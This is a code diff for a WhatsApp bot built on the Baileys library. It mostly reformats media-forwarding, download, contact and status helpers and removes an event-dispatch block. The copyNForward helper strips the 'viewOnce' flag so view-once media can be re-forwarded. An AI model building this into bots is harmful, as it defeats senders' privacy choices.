-// Process command.on events
-events.commands.map(async(command) => {
-  const tools = {
-    from, l, 
-    quoted: mek,
-    body, 
-    isCmd, 
-    command: cmdName, 
-    args, 
-    q, 
-    text: body,
-    isGroup, 
-    sender, 
-    senderNumber, 
-    botNumber2, 
-    botNumber, 
-    pushname, 
-    isMe, 
-    isOwner: isCreator,
-    isCreator, 
-    groupMetadata, 
-    groupName, 
-    participants, 
-    groupAdmins, 
-    isBotAdmins, 
-    isAdmins, 
-    reply
-  };
-  
-  if (body && command.on === "body") {
-    console.log(`Processing command.on="body": ${command.pattern || command.alias?.[0]}`);
-    await command.function(malvin, mek, m, tools);
-  } else if (mek.q && command.on === "text") {
-    console.log(`Processing command.on="text": ${command.pattern || command.alias?.[0]}`);
-    await command.function(malvin, mek, m, tools);
-  } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
-    console.log(`Processing command.on="image": ${command.pattern || command.alias?.[0]}`);
-    await command.function(malvin, mek, m, tools);
-  } else if (command.on === "sticker" && mek.type === "stickerMessage") {
-    console.log(`Processing command.on="sticker": ${command.pattern || command.alias?.[0]}`);
-    await command.function(malvin, mek, m, tools);
-  }
-});
-});
 
 // Helper functions for malvin object
 malvin.copyNForward = async(jid, message, forceForward = false, options = {}) => {
-  let vtype
+  let vtype;
   if (options.readViewOnce) {
-      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
-      vtype = Object.keys(message.message.viewOnceMessage.message)[0]
-      delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
-      delete message.message.viewOnceMessage.message[vtype].viewOnce
-      message.message = { ...message.message.viewOnceMessage.message }
+    message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
+    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
+    delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
+    delete message.message.viewOnceMessage.message[vtype].viewOnce;
+    message.message = { ...message.message.viewOnceMessage.message };
   }
-  let mtype = Object.keys(message.message)[0]
-  let content = await generateForwardMessageContent(message, forceForward)
-  let ctype = Object.keys(content)[0]
-  let context = {}
-  if (mtype != "conversation") context = message.message[mtype].contextInfo
-  content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
-  const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options } : {})
-  await malvin.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
-  return waMessage
-}
+  let mtype = Object.keys(message.message)[0];
+  let content = await generateForwardMessageContent(message, forceForward);
+  let ctype = Object.keys(content)[0];
+  let context = {};
+  if (mtype != "conversation") context = message.message[mtype].contextInfo;
+  content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
+  const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options } : {});
+  await malvin.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
+  return waMessage;
+};
 
 // Fixed download function with FileType.fromBuffer
 malvin.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
-  let quoted = message.msg ? message.msg : message
-  let mime = (message.msg || message).mimetype || ''
-  let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-  const stream = await downloadContentFromMessage(quoted, messageType)
-  let buffer = Buffer.from([])
-  for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
-  let type = await FileType.fromBuffer(buffer)
-  trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
-  await fs.writeFile(trueFileName, buffer)
-  return trueFileName
-}
+  let quoted = message.msg ? message.msg : message;
+  let mime = (message.msg || message).mimetype || '';
+  let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+  const stream = await downloadContentFromMessage(quoted, messageType);
+  let buffer = Buffer.from([]);
+  for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
+  let type = await FileType.fromBuffer(buffer);
+  let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
+  await fs.writeFile(trueFileName, buffer);
+  return trueFileName;
+};
 
 malvin.downloadMediaMessage = async(message) => {
-  let mime = (message.msg || message).mimetype || ''
-  let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
-  const stream = await downloadContentFromMessage(message, messageType)
-  let buffer = Buffer.from([])
-  for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
-  return buffer
-}
+  let mime = (message.msg || message).mimetype || '';
+  let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+  const stream = await downloadContentFromMessage(message, messageType);
+  let buffer = Buffer.from([]);
+  for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
+  return buffer;
+};
 
 malvin.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-  let res = await axios.head(url)
-  let mime = res.headers['content-type']
-  if (mime.split("/")[1] === "gif") return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted })
-  if (mime === "application/pdf") return malvin.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted })
-  if (mime.split("/")[0] === "image") return malvin.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted })
-  if (mime.split("/")[0] === "video") return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted })
-  if (mime.split("/")[0] === "audio") return malvin.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted })
-}
+  let res = await axios.head(url);
+  let mime = res.headers['content-type'];
+  if (mime.split("/")[1] === "gif") return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted });
+  if (mime === "application/pdf") return malvin.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted });
+  if (mime.split("/")[0] === "image") return malvin.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted });
+  if (mime.split("/")[0] === "video") return malvin.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted });
+  if (mime.split("/")[0] === "audio") return malvin.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted });
+};
 
 malvin.cMod = (jid, copy, text = '', sender = malvin.user.id, options = {}) => {
-  let mtype = Object.keys(copy.message)[0]
-  let isEphemeral = mtype === 'ephemeralMessage'
-  if (isEphemeral) mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
-  let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
-  let content = msg[mtype]
-  if (typeof content === 'string') msg[mtype] = text || content
-  else if (content.caption) content.caption = text || content.caption
-  else if (content.text) content.text = text || content.text
-  if (typeof content !== 'string') msg[mtype] = { ...content, ...options }
-  copy.key.remoteJid = jid
-  copy.key.fromMe = sender === malvin.user.id
-  return proto.WebMessageInfo.fromObject(copy)
-}
+  let mtype = Object.keys(copy.message)[0];
+  let isEphemeral = mtype === 'ephemeralMessage';
+  if (isEphemeral) mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
+  let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
+  let content = msg[mtype];
+  if (typeof content === 'string') msg[mtype] = text || content;
+  else if (content.caption) content.caption = text || content.caption;
+  else if (content.text) content.text = text || content.text;
+  if (typeof content !== 'string') msg[mtype] = { ...content, ...options };
+  copy.key.remoteJid = jid;
+  copy.key.fromMe = sender === malvin.user.id;
+  return proto.WebMessageInfo.fromObject(copy);
+};
 
 malvin.getFile = async(PATH, save) => {
-  let res
-  let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fsSync.existsSync(PATH) ? fsSync.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-  let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
-  let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
-  if (data && save) fs.writeFile(filename, data)
-  return { res, filename, size: data.length, ...type, data }
-}
+  let res;
+  let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fsSync.existsSync(PATH) ? fsSync.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
+  let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' };
+  let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
+  if (data && save) fs.writeFile(filename, data);
+  return { res, filename, size: data.length, ...type, data };
+};
 
 malvin.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
-  let types = await malvin.getFile(PATH, true)
-  let { filename, mime, data } = types
-  let type = /image/.test(mime) ? 'image' : /video/.test(mime) ? 'video' : /audio/.test(mime) ? 'audio' : 'document'
-  await malvin.sendMessage(jid, { [type]: { url: filename }, mimetype: mime, fileName, ...options }, { quoted })
-  return fs.unlink(filename)
-}
+  let types = await malvin.getFile(PATH, true);
+  let { filename, mime, data } = types;
+  let type = /image/.test(mime) ? 'image' : /video/.test(mime) ? 'video' : /audio/.test(mime) ? 'audio' : 'document';
+  await malvin.sendMessage(jid, { [type]: { url: filename }, mimetype: mime, fileName, ...options }, { quoted });
+  return fs.unlink(filename);
+};
 
 malvin.parseMention = async(text) => {
-  return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
-}
+  return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
+};
 
 malvin.getName = (jid, withoutContact = false) => {
-    id = malvin.decodeJid(jid);
-    let v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === malvin.decodeJid(malvin.user.id) ? malvin.user : {}
-    return v.name || v.subject || v.verifiedName || jid.split('@')[0];
+  let id = malvin.decodeJid(jid);
+  let v = id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : id === malvin.decodeJid(malvin.user.id) ? malvin.user : {};
+  return v.name || v.subject || v.verifiedName || jid.split('@')[0];
 };
 
 malvin.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-    let list = [];
-    for (let i of kon) {
-        list.push({
-            displayName: await malvin.getName(i + '@s.whatsapp.net'),
-            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(i + '@s.whatsapp.net')}\nFN:Owner\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nEND:VCARD`,
-        });
-    }
-    malvin.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
+  let list = [];
+  for (let i of kon) {
+    list.push({
+      displayName: await malvin.getName(i + '@s.whatsapp.net'),
+      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(i + '@s.whatsapp.net')}\nFN:Owner\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nEND:VCARD`,
+    });
+  }
+  malvin.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
 };
 
 malvin.setStatus = status => {
-    malvin.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
-    return status;
+  malvin.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] });
+  return status;
 };
 
-malvin.serializeM = mek => sms(malvin, mek, store);
+malvin.serializeM = mek => sms(malvin, mek);
 
+// Express routes
 app.use(express.static(path.join(__dirname, "lib")));
 app.get("/", (req, res) => { res.redirect("/marisel.html"); });
 app.listen(port, () => console.log(chalk.cyan(`\n╭──[ hello user ]─\n│🤗 hi your bot is live \n╰──────────────`)));
